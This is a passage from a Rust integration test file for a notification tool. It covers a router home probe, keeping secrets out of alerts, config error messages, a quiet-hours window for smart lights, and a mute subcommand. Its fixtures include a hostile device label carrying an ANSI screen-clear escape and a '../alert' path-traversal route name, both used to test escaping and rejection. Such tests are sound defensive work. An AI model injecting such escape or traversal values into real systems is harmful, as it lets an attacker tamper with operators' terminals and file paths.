        &format!("cat >\"{}/router.event\"", sandbox.display()),
    );
    let router = RouterStub::start(KEYS_AWAY);
    sandbox.write_config(&stale_config(&router.url()));
    let home = || {
        let mut probe = home_probe(&sandbox);
        run(&mut probe);
    };

    home();
    assert!(alerts(&sandbox).is_empty(), "away is not a staleness");
    router.set_listing(NO_LISTING);
    home();
    assert!(
        alerts(&sandbox).is_empty(),
        "an unreadable answer is not a staleness"
    );
    // The same probe on a Home reading DOES alert, which is what makes the
    // two silences above assertions rather than a test that never armed.
    router.set_listing(KEYS_DISAGREE);
    home();
    assert_eq!(alerts(&sandbox).len(), 1, "a Home reading alerts");
    assert!(
        !sandbox.fired("router"),
        "the roster registers router as a SENSOR: an input carries no routing, \
         so the alert ABOUT its reading can never be delivered back to it"
    );
}

/// The same disagreement, with the OTHER client named in text nobody here
/// typed: a quote and an ANSI screen clear, straight out of the router.
const KEYS_DISAGREE_HOSTILE_LABEL: &str = r#"{"data":[
    {"name":"mister","ipAddress":"192.168.1.169","macAddress":"2e:11:ab:6d:b0:4f"},
    {"name":"mo\"use\u001b[2J","ipAddress":"192.168.1.248","macAddress":"60:82:46:3c:fb:01"}]}"#;

#[test]
fn the_alert_carries_no_secret_and_no_raw_router_text() {
    // TWO SECRETS ARE IN REACH on this path now: the router's own api_key,
    // which `home_mode` reads, and the hermes signing key, which the dispatch
    // reads. Neither may ride an event to a channel or a line to a terminal.
    let sandbox = Sandbox::new("home-stale-alert-secrets");
    count_alerts(&sandbox);
    let router = RouterStub::start(KEYS_DISAGREE_HOSTILE_LABEL);
    sandbox.write_config(&format!(
        "[plugins.hermes]\nenabled = true\nkey = \"hermes-signing-secret\"\n{}",
        router_table(&router.url())
    ));
    let mut probe = home_probe(&sandbox);
    let output = run(&mut probe);

    let delivered = std::fs::read_to_string(sandbox.path("hermes.events")).expect("an alert");
    for secret in ["k-123", "hermes-signing-secret"] {
        assert!(
            !delivered.contains(secret),
            "the delivered event carries {secret:?}: {delivered}"
        );
        assert!(
            !stderr(&output).contains(secret),
            "stderr carries {secret:?}: {}",
            stderr(&output)
        );
        assert!(
            !stdout(&output).contains(secret),
            "the diagnostic carries {secret:?}: {}",
            stdout(&output)
        );
    }
    // THE ROUTER'S OWN STRINGS keep slice 4's escape in the terminal, and
    // reach the alert body not at all: the sentence is built from config KEY
    // NAMES, so a client label cannot ride it out to a channel.
    assert!(
        stdout(&output).contains(
            "home:   device_ipv4 \"192.168.1.248\" matched a different client \
             \"mo\\\"use\\u{1b}[2J\""
        ),
        "the evidence escapes the label: {}",
        stdout(&output)
    );
    assert_eq!(alerts(&sandbox)[0]["detail"], STALE_WARNING);
}

#[test]
fn an_unusable_stale_alert_route_complains_and_still_delivers_the_alert() {
    // LOUD-WARD: a config typo in the ROUTE must not be what silences the
    // warning that route was configured for. The complaint names the config
    // key, because that is the file the operator has to open, and the alert
    // still goes out on the route they would have had by writing nothing.
    let sandbox = Sandbox::new("home-stale-alert-bad-route");
    count_alerts(&sandbox);
    let router = RouterStub::start(KEYS_DISAGREE);
    sandbox.write_config(&format!(
        "{}stale_alert_channel = \"../alert\"\n",
        stale_config(&router.url())
    ));
    let mut probe = home_probe(&sandbox);
    let output = run(&mut probe);

    assert_eq!(
        stderr(&output).trim_end(),
        "pns: config error (stale_alert_channel = \"../alert\" in [plugins.router] is not a \
         usable route name); the stale alert posts to the default route"
    );
    assert_eq!(
        alerts(&sandbox).len(),
        1,
        "the alert is still delivered, on the default route"
    );
    assert_eq!(
        stdout(&output),
        format!("{STALE_EVIDENCE}\n{STALE_WARNING}\n"),
        "and the diagnostic itself is untouched"
    );
}

#[test]
fn every_way_the_home_probe_is_not_set_up_says_which_one_it_is() {
    // `home_mode` is the ONE place a cause becomes the line an operator
    // reads, and that wiring only runs through the binary: collapsing its two
    // failure arms onto a single message left every other test green, so a
    // disabled probe and a brand nothing answers could both print "no
    // api_key" with nothing to say so. Exact lines, because a cause that
    // merely contains "home:" sends the operator to the wrong edit.
    let sandbox = Sandbox::new("home-setup-failures");
    // Every case here stops before the router is read, so none of them can
    // reach a delivery; it still runs in the safe environment, because "this
    // path happens not to dispatch today" is not a property a test should be
    // relying on to stay off the operator's real gateway.
    let home_line = || {
        let mut probe = home_probe(&sandbox);
        stdout(&run(&mut probe)).trim_end().to_string()
    };
    // No config has been written yet, so this case has to come first.
    assert_eq!(home_line(), "home: not configured (no config file)");
    for (config, line) in [
        (
            // The retired feature table, refused by NAME rather than ignored.
            "[home]\nrouter_url = \"https://192.168.1.1\"\nphone = \"mister\"\n",
            "home: config error (unknown top-level key `home`)",
        ),
        (
            "[plugins.hermes]\nenabled = true\n",
            "home: not configured (no [plugins.router] table)",
        ),
        (
            "[plugins.router]\nenabled = false\nbrand = \"unifi\"\n\
             router_url = \"https://192.168.1.1\"\ndevice_hostname = \"mister\"\napi_key = \"k-123\"\n",
            "home: [plugins.router] is present but enabled = false",
        ),
        (
            "[plugins.router]\nenabled = true\n\
             router_url = \"https://192.168.1.1\"\ndevice_hostname = \"mister\"\napi_key = \"k-123\"\n",
            "home: no brand in [plugins.router] (the only brand is \"unifi\")",
        ),
        (
            "[plugins.router]\nenabled = true\nbrand = \"asus\"\n\
             router_url = \"https://192.168.1.1\"\ndevice_hostname = \"mister\"\napi_key = \"k-123\"\n",
            "home: [plugins.router] has brand \"asus\", which no compiled-in backend answers \
             (the only brand is \"unifi\")",
        ),
        (
            // The URL is the one setting left outside the device keys, so it
            // keeps its own line, and that line no longer names them.
            "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n\
             device_hostname = \"mister\"\napi_key = \"k-123\"\n",
            "home: the [plugins.router] table is present but router_url is missing, empty, \
             or not a string",
        ),
        (
            // A table with no device in it at all. A config still carrying the
            // retired `phone` key lands here, and the line names the three keys
            // to set rather than the key that went away: no back-compat, so
            // nothing here mentions `phone`.
            "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n\
             router_url = \"https://192.168.1.1\"\nphone = \"mister\"\napi_key = \"k-123\"\n",
            "home: no device to look for in [plugins.router] \
             (set at least one of device_mac, device_hostname, device_ipv4)",
        ),
        (
            "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n\
             router_url = \"https://192.168.1.1\"\ndevice_ipv4 = \"192.168.1\"\napi_key = \"k-123\"\n",
            "home: device_ipv4 = \"192.168.1\" in [plugins.router] is not an IPv4 address \
             (a dotted quad, e.g. \"192.168.1.169\")",
        ),
        (
            "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n\
             router_url = \"https://192.168.1.1\"\ndevice_mac = \"2e11ab6db04f\"\napi_key = \"k-123\"\n",
            "home: device_mac = \"2e11ab6db04f\" in [plugins.router] is not a MAC address \
             (six hex pairs under one separator, e.g. \"2e:11:ab:6d:b0:4f\")",
        ),
        (
            // Everything else is in order, so the key is the only thing left
            // to be missing, and the probe stops before it reaches a router.
            "[plugins.router]\nenabled = true\nbrand = \"unifi\"\n\
             router_url = \"https://192.168.1.1\"\ndevice_hostname = \"mister\"\n",
            "home: no api_key in the [plugins.router] table (the probe is not set up)",
        ),
    ] {
        sandbox.write_config(config);
        assert_eq!(home_line(), line, "case: {config:?}");
    }
}

// --- the lights quiet window ------------------------------------------------

/// The pulse's whole visible effect at this boundary is whether it dialled, so
/// a bare loopback listener IS the bridge: nothing here speaks CLIP and
/// nothing has to.
fn bridge_spy() -> (std::net::TcpListener, u16) {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("listener");
    let port = listener.local_addr().expect("addr").port();
    listener.set_nonblocking(true).expect("nonblocking");
    (listener, port)
}

/// Whether the pulse dialled the bridge inside `limit`.
///
/// ACCEPTING HANGS UP AT ONCE, which is what keeps a test that expects a dial
/// fast: the engine's TLS handshake fails on the closed socket instead of
/// waiting out the ten-second bridge deadline.
fn dialled_within(listener: &std::net::TcpListener, limit: std::time::Duration) -> bool {
    let deadline = std::time::Instant::now() + limit;
    loop {
        match listener.accept() {
            Ok(_) => return true,
            Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {}
            Err(error) => panic!("the bridge spy stopped listening: {error}"),
        }
        if std::time::Instant::now() >= deadline {
            return false;
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }
}

/// Long enough for a dial that was going to happen to have happened: the child
/// has already exited by the time this is asked, so the connection would be
/// sitting in the accept queue.
const SETTLE: std::time::Duration = std::time::Duration::from_millis(200);

/// The UTC minute of the day, from the epoch alone. Every test below pins the
/// child to `TZ=UTC`, so this is the minute the engine's own clock reads,
/// with no local-time library on this side of the boundary.
fn utc_minute_now() -> u16 {
    let epoch = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("a clock past 1970")
        .as_secs();
    u16::try_from((epoch % 86_400) / 60).expect("a minute of the day")
}

/// A window `radius` minutes either side of `centre`, wrapped into the day and
/// spelled the way the config takes it. Hours wide on purpose: the child reads
/// its own clock a moment after this one does, and a window that narrow would
/// be timing the test rather than the gate.
fn window_around(centre: u16, radius: u16) -> String {
    let start = (centre + 1440 - radius) % 1440;
    let end = (centre + radius) % 1440;
    format!(
        "{:02}:{:02}-{:02}:{:02}",
        start / 60,
        start % 60,
        end / 60,
        end % 60
    )
}

#[test]
fn a_pulse_earned_inside_the_quiet_window_reaches_no_bridge_and_costs_no_other_leg() {
    // The window mutes the LIGHTS and nothing else: the card and the log are
    // how a long command reports at any hour, and only the room stays dark.
    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-window-mutes-the-pulse");
    sandbox.write_config(&format!(
        "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
         quiet_hours = \"{}\"\n[plugins.moshi]\nenabled = true\n\
         [plugins.hermes]\nenabled = true\n",
        window_around(utc_minute_now(), 120)
    ));
    let mut command = sandbox.pns();
    command.env("TZ", "UTC");
    sandbox.stub_herdr(&mut command, false);
    run(command
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2", "--long-running"]));
    assert!(
        sandbox.fired("moshi") && sandbox.fired("hermes"),
        "every other leg still dispatches inside the window"
    );
    assert!(
        !dialled_within(&listener, SETTLE),
        "and the room stays dark"
    );
}

#[test]
fn a_malformed_quiet_hours_refuses_once_and_only_where_a_pulse_was_due() {
    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-window-malformed");
    sandbox.write_config(&format!(
        "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
         quiet_hours = \"10pm-7am\"\n[plugins.hermes]\nenabled = true\n"
    ));

    // An event that earned no pulse says nothing about the window: a refusal
    // on every notification is the noise this gate sits inside the `if` to
    // avoid.
    let mut ordinary = sandbox.pns();
    sandbox.stub_herdr(&mut ordinary, false);
    let ordinary = run(ordinary.args(["--agent", "claude", "--state", "done", "--detail", "x"]));
    assert!(
        !stderr(&ordinary).contains("quiet_hours"),
        "a notification that was never going to light the room is not where a \
         window is diagnosed: {}",
        stderr(&ordinary)
    );

    let mut pulsing = sandbox.pns();
    sandbox.stub_herdr(&mut pulsing, false);
    let pulsing = run(pulsing
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2", "--long-running"]));
    let said = stderr(&pulsing);
    assert_eq!(
        said.matches("hue.quiet_hours").count(),
        1,
        "one refusal, naming the key: {said}"
    );
    assert!(
        said.contains("10pm-7am"),
        "and echoing what was written: {said}"
    );
    assert!(
        !dialled_within(&listener, SETTLE),
        "a window nobody can parse leaves the room dark rather than flashing it"
    );
}

#[test]
fn the_hand_run_pulse_reaches_the_bridge_inside_the_quiet_window() {
    // The drill is EXEMPT, structurally: `pns pulse` never passes the event
    // path's gate, because gating it would make the quiet window impossible to
    // check by hand exactly while it is on.
    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-window-manual-pulse");
    sandbox.write_config(&format!(
        "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
         quiet_hours = \"{}\"\n",
        window_around(utc_minute_now(), 120)
    ));
    let mut command = sandbox.bare();
    command.env("TZ", "UTC");
    let child = command
        .args(["pulse", "0"])
        .spawn()
        .expect("the engine starts");
    assert!(
        dialled_within(&listener, std::time::Duration::from_secs(5)),
        "the operator asked for a pulse by hand and got one"
    );
    assert_eq!(
        wait_bounded(child, std::time::Duration::from_secs(5)),
        Some(0),
        "and it still exits zero"
    );
}

/// The `[plugins.hue]` config the two halves below share, quiet hours apart.
fn hue_config(port: u16, quiet_hours: &str) -> String {
    format!(
        "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
         quiet_hours = \"{quiet_hours}\"\n[plugins.hermes]\nenabled = true\n"
    )
}

/// Asia/Tokyo: nine hours ahead of UTC, and no daylight saving since 1951, so
/// the child's own minute of the day is arithmetic on this side and no window
/// here can straddle a transition.
const TOKYO_MINUTES_AHEAD: u16 = 9 * 60;

#[test]
fn the_window_is_read_in_the_zone_the_child_was_given() {
    // THE ONE TEST PROVING THE ZONE WIRING. Both halves are built from Tokyo
    // time, and both are placed so that a child reading the HOST's zone (or
    // UTC, on a runner that has no other) lands on the wrong side: the quiet
    // half would dial, and the loud half, which is the twelve hours on the far
    // side of the clock, would go dark.
    let tokyo_now = (utc_minute_now() + TOKYO_MINUTES_AHEAD) % 1440;

    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-window-zone-quiet");
    sandbox.write_config(&hue_config(port, &window_around(tokyo_now, 120)));
    let mut quiet = sandbox.pns();
    quiet.env("TZ", "Asia/Tokyo");
    sandbox.stub_herdr(&mut quiet, false);
    run(quiet
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2", "--long-running"]));
    assert!(
        !dialled_within(&listener, SETTLE),
        "the child is inside a window written in ITS zone, so the room stays dark"
    );

    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-window-zone-loud");
    sandbox.write_config(&hue_config(
        port,
        &window_around((tokyo_now + 720) % 1440, 360),
    ));
    let mut loud = sandbox.pns();
    loud.env("TZ", "Asia/Tokyo");
    sandbox.stub_herdr(&mut loud, false);
    let child = loud
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2", "--long-running"])
        .spawn()
        .expect("the engine starts");
    assert!(
        dialled_within(&listener, std::time::Duration::from_secs(5)),
        "and outside one it pulses"
    );
    assert_eq!(
        wait_bounded(child, std::time::Duration::from_secs(5)),
        Some(0),
        "on the exit-zero edge either way"
    );
}

// --- the operator mute ------------------------------------------------------

/// The mute command, with its state file inside the sandbox.
///
/// `PNS_STATE_DIR` RIDES ON THE COMMAND, never through `set_var`: this binary
/// is threaded, and a process-wide mutation would decide another test's mute.
fn quiet_command(sandbox: &Sandbox) -> std::process::Command {
    let mut command = sandbox.pns();
    command.env("PNS_STATE_DIR", sandbox.path("state"));
    command.arg("quiet");
    command
}

/// The state file the mute is published to.
fn quiet_state(sandbox: &Sandbox) -> std::path::PathBuf {
    sandbox.path("state/quiet-until")
}

#[test]
fn a_typed_duration_is_published_as_an_expiry_and_reporting_it_does_not_move_it() {
    let sandbox = Sandbox::new("quiet-set");
    let output = run(quiet_command(&sandbox).arg("30m"));
    assert_eq!(
        stdout(&output).trim_end(),
        "pns: quiet for another 30 minutes"
    );
    let published =
        std::fs::read_to_string(quiet_state(&sandbox)).expect("the mute is on disk to survive");
    // ONE ABSOLUTE EXPIRY, not a flag and not a start plus a duration: every
    // reader compares it with its own clock, so nothing has to know when the
    // mute began and a file left behind after the window is inert.
    let expiry: u64 = published.trim().parse().expect("one epoch second");
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("a clock past 1970")
        .as_secs();
    assert!(
        (now + 1_795..=now + 1_800).contains(&expiry),
        "thirty minutes from now, got {expiry} against {now}"
    );

    // THE NO-ARGUMENT FORM REPORTS AND MUTES NOTHING, which is what keeps any
    // invocation from muting by accident.
    let again = run(&mut quiet_command(&sandbox));
    assert_eq!(
        stdout(&again).trim_end(),
        "pns: quiet for another 30 minutes"
    );
    assert_eq!(
        std::fs::read_to_string(quiet_state(&sandbox)).expect("still on disk"),
        published,
        "a report must not rewrite the mute it is reporting"
    );
}

#[test]
fn off_removes_the_state_file_and_the_next_event_decorates_again() {
    let sandbox = Sandbox::new("quiet-off");
    run(quiet_command(&sandbox).arg("30m"));
    assert!(quiet_state(&sandbox).exists(), "muted to begin with");

    let output = run(quiet_command(&sandbox).arg("off"));
    assert_eq!(stdout(&output).trim_end(), "pns: not quiet");
    // UNLINKED, not overwritten with a past expiry or a flag reading off: an
    // absent file is the state every reader already treats as not muted.
    assert!(
        !quiet_state(&sandbox).exists(),
        "off leaves nothing behind to interpret"
    );

    let mut event = sandbox.pns();
    event.env("PNS_STATE_DIR", sandbox.path("state"));
    event.env("PNS_IDLE_SECS", "0");
    sandbox.stub_herdr(&mut event, false);
    run(event
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(
        sandbox.fired("macos-banner"),
        "the banner is back the moment the mute is off"
    );
}

#[test]
fn a_muted_away_event_reaches_the_durable_log_alone_and_never_the_bridge() {
    // The whole mute, end to end: a file, a clock and a subcommand, which is
    // only provable through the binary. Away and long running is the loudest
    // row in the matrix, so it is the one worth silencing.
    let away_and_long = |sandbox: &Sandbox, port: u16| {
        sandbox.write_config(&format!(
            "[plugins.hue]\nenabled = true\nbridge = \"127.0.0.1:{port}\"\nkey = \"k\"\n\
             [plugins.moshi]\nenabled = true\n[plugins.hermes]\nenabled = true\n\
             [plugins.macos-banner]\nenabled = true\n"
        ));
        let mut event = sandbox.pns();
        event.env("PNS_STATE_DIR", sandbox.path("state"));
        event
            .args(["--agent", "claude", "--state", "done", "--detail", "x"])
            .args(["--pane", "t1:p2", "--long-running"]);
        event
    };

    // THE UNMUTED CONTROL, so the silence below is the mute and not a config
    // that was never going to fire anything.
    let (listener, port) = bridge_spy();
    let loud = Sandbox::new("quiet-muted-control");
    let mut command = away_and_long(&loud, port);
    let child = command.spawn().expect("the engine starts");
    assert!(
        dialled_within(&listener, std::time::Duration::from_secs(5)),
        "unmuted control: the room lights"
    );
    assert_eq!(
        wait_bounded(child, std::time::Duration::from_secs(5)),
        Some(0)
    );
    assert!(loud.fired("moshi"), "unmuted control: the phone is carded");

    let (listener, port) = bridge_spy();
    let sandbox = Sandbox::new("quiet-muted-event");
    std::fs::create_dir_all(sandbox.path("state")).expect("state dir");
    let expiry = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("a clock past 1970")
        .as_secs()
        + 600;
    std::fs::write(quiet_state(&sandbox), format!("{expiry}\n")).expect("the mute");
    run(&mut away_and_long(&sandbox, port));

    assert!(
        sandbox.fired("hermes"),
        "THE RECORD SURVIVES THE MUTE: hermes is not a field of the delivery \
         plan, so the durable log is exempt structurally and the mute is lossless"
    );
    assert!(!sandbox.fired("moshi"), "no card while muted");
    assert!(!sandbox.fired("macos-banner"), "no banner while muted");
    assert!(
        !dialled_within(&listener, SETTLE),
        "and no pulse, so slice 7's window is never even consulted"
    );
}

#[test]
fn a_corrupt_state_file_delivers_everything_and_complains_once_per_event() {
    // THE FAIL DIRECTION, and the one a reviewer should attack first: a file
    // nobody can parse is NOT muted. Failing closed here would cost every
    // notification, including the card for a tool call the operator is blocked
    // on, with no expiry on it and nothing announcing the state.
    let sandbox = Sandbox::new("quiet-corrupt");
    std::fs::create_dir_all(sandbox.path("state")).expect("state dir");
    std::fs::write(quiet_state(&sandbox), "later\n").expect("a broken mute");

    let mut event = sandbox.pns();
    event.env("PNS_STATE_DIR", sandbox.path("state"));
    // At the desk with the pane out of sight, and the card forced: the one
    // event that earns BOTH decorations, so a mute reading true here would be
    // unmissable.
    event.env("PNS_IDLE_SECS", "0");
    event.env("PNS_FORCE_PHONE", "1");
    sandbox.stub_herdr(&mut event, false);
    let output = run(event
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));

    assert!(sandbox.fired("macos-banner"), "a broken mute mutes nothing");
    assert!(sandbox.fired("moshi"), "including a forced card");
    assert!(sandbox.fired("hermes"));
    // ONE COMPLAINT PER EVENT, not one per reader: the file is broken until
    // someone fixes it, so it repeats on the next event, but a single run must
    // not say it twice.
    let complaints = stderr(&output)
        .lines()
        .filter(|line| line.starts_with("pns: state error"))
        .map(String::from)
        .collect::<Vec<_>>();
    assert_eq!(
        complaints,
        vec![
            "pns: state error (quiet-until is \"later\", not an expiry time); \
             nothing is muted, clear it with pns quiet off"
        ],
        "the file's own content, and the remedy, said once: {}",
        stderr(&output)
    );
}

#[test]
fn an_absent_state_file_is_the_ordinary_state_and_says_nothing() {
    // The normal case must be silent, or the complaint becomes noise on every
    // event forever and stops being read.
    let sandbox = Sandbox::new("quiet-absent");
    let mut event = sandbox.pns();
    event.env("PNS_STATE_DIR", sandbox.path("state"));
    event.env("PNS_IDLE_SECS", "0");
    sandbox.stub_herdr(&mut event, false);
    let output = run(event
        .args(["--agent", "claude", "--state", "done", "--detail", "x"])
        .args(["--pane", "t1:p2"]));
    assert!(sandbox.fired("macos-banner"));
    assert_eq!(stderr(&output), "", "no file, no news");
}

#[test]
fn a_word_the_mute_does_not_serve_prints_usage_exits_nonzero_and_writes_no_state() {
    // A SUBCOMMAND THAT SILENTLY ACCEPTS A TYPO IS A MUTE THE OPERATOR
    // BELIEVES IS ON. This is not the always-exit-0 contract's territory: that
    // covers the hook and notification paths, where a non-zero exit would fail
    // the turn being reported on, and `pns quiet` is hand typed.
    const USAGE: &str =
        "pns: usage: pns quiet [<duration>|off]; duration is <count><s|m|h>, from 1s to 24h";
    for arguments in [
        vec!["tomorrow"],
        vec!["30"],
        vec!["off", "please"],
        vec!["30m", "extra"],
    ] {
        let sandbox = Sandbox::new("quiet-refusal");
        let output = quiet_command(&sandbox)
            .args(&arguments)
            .output()
            .expect("the engine runs");
        assert_eq!(
            output.status.code(),
            Some(2),
            "arguments: {arguments:?}, stderr: {}",
            stderr(&output)
        );
        assert!(
            stderr(&output).lines().any(|line| line == USAGE),
            "arguments: {arguments:?}, stderr: {}",
            stderr(&output)
        );
        assert_eq!(stdout(&output), "", "arguments: {arguments:?}");
        assert!(
            !quiet_state(&sandbox).exists(),
            "a refused mute writes no state: {arguments:?}"
        );
    }
}
